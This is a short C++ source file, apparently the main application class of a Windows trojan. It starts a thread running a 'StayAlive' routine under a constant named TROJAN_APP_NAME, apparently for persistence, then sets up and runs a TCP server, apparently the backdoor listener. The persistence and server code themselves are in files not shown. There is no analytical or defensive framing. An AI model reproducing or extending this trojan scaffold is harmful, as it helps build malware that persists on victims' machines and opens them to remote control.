#include "..\pch.h"

#include "Application.hpp"
#include "Server.h"
#include "..\Tools.h"
#include "..\Debugger.h"
#include "..\Constants.h"

BOOL Application::startSavingThread()
{
	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&StayAlive), TROJAN_APP_NAME, 0, NULL))
	{
		PrintError(TEXTH("CreateThread"), GetLastError());

		return FALSE;
	}

	return TRUE;
}

Application::Application() :
	m_tcpServer_sock(INVALID_SOCKET)
{
}

Application::~Application()
{
	closesocket(m_tcpServer_sock);
	WSACleanup();
}

BOOL Application::init()
{
	if(!startSavingThread())
		return FALSE;

	WSADATA wsaData;
	INT iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		$error _tprintf(TEXTH("WSAStartup failed with error: %d\n"), iResult);

		return FALSE;
	}

	m_tcpServer_sock = InitTCPServer();
	if (m_tcpServer_sock == INVALID_SOCKET)
	{
		$error _tprintf(TEXT("Cannot initialize the server\n"));

		return FALSE;
	}

	$i _tprintf(TEXTH("Startup finished\n"));

	return TRUE;
}

VOID Application::run()
{
	RunServer(m_tcpServer_sock);
}
